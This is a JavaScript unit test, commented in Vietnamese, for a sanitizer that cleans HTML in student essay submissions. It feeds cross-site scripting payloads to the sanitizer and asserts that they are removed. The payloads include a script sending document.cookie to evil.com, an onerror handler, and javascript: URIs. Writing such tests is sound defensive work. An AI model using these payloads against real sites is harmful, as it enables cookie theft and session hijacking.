const assert = require('assert');
const { sanitizeEssayHtml } = require('../services/security/sanitizeHtml');

// 1. Noi dung binh thuong (chu + cong thuc dang span + anh viet tay data:) phai giu nguyen
const normal = '<p>Ta co (x-2)(x-3) = 0</p><span>a</span><sup>2</sup><img src="data:image/png;base64,iVBORw0KGgo=" width="100">';
const out1 = sanitizeEssayHtml(normal);
assert(out1.includes('<p>Ta co'), 'Nội dung chữ bình thường phải được giữ nguyên');
assert(out1.includes('<img'), 'Ảnh dạng data:image phải được giữ lại');
assert(out1.includes('width="100"'), 'Thuộc tính an toàn (width) phải được giữ');

// 2. Chen script phai bi loai bo hoan toan (ca the va noi dung ben trong)
const xss1 = '<p>bài làm</p><script>fetch("https://evil.com?c="+document.cookie)</script>';
const out2 = sanitizeEssayHtml(xss1);
assert(!out2.includes('<script'), 'Thẻ script phải bị loại bỏ hoàn toàn');
assert(!out2.includes('evil.com'), 'Nội dung bên trong script cũng phải bị loại bỏ');

// 3. onerror/onclick... phai bi loai dù nam trong the duoc phep (img)
const xss2 = "<img src=\"data:image/png;base64,abc\" onerror=\"fetch('https://evil.com')\">";
const out3 = sanitizeEssayHtml(xss2);
assert(!/onerror/i.test(out3), 'Thuộc tính onerror phải bị loại bỏ dù ở trong thẻ img hợp lệ');

// 4. img voi src la URL ngoai (khong phai data:) phai bi bo thuoc tinh src (tranh tracking pixel)
const xss3 = '<img src="https://evil.com/track.png?x=1">';
const out4 = sanitizeEssayHtml(xss3);
assert(!out4.includes('evil.com'), 'Ảnh trỏ ra URL ngoài (không phải data:) không được giữ lại src');

// 5. The khong nam trong danh sach cho phep (vd iframe, a, form) phai bi loai, script/iframe mat ca noi dung
const xss4 = '<p>text</p><iframe src="javascript:alert(1)"></iframe><a href="javascript:alert(2)">click</a>';
const out5 = sanitizeEssayHtml(xss4);
assert(!out5.includes('<iframe'), 'Thẻ iframe phải bị loại bỏ');
assert(!out5.includes('<a '), 'Thẻ a (link) không nằm trong danh sách cho phép, phải bị loại bỏ');
assert(!out5.includes('javascript:'), 'javascript: URI không được xuất hiện trong kết quả');

// 6. style attribute phai bi bo (co the chua expression()/url() nguy hiem tren trinh duyet cu)
const xss5 = '<p style="background:url(javascript:alert(1))">text</p>';
const out6 = sanitizeEssayHtml(xss5);
assert(!/style\s*=/i.test(out6), 'Thuộc tính style phải bị loại bỏ hoàn toàn');

// 7. Gioi han do dai hop ly, khong crash voi input rat dai
const longInput = '<p>' + 'a'.repeat(300000) + '</p>';
const out7 = sanitizeEssayHtml(longInput);
assert(out7.length <= 200100, 'Phải giới hạn độ dài, không lưu chuỗi vô hạn vào CSDL');

console.log('sanitizeHtml tests passed (chống XSS cho bài làm tự luận)');
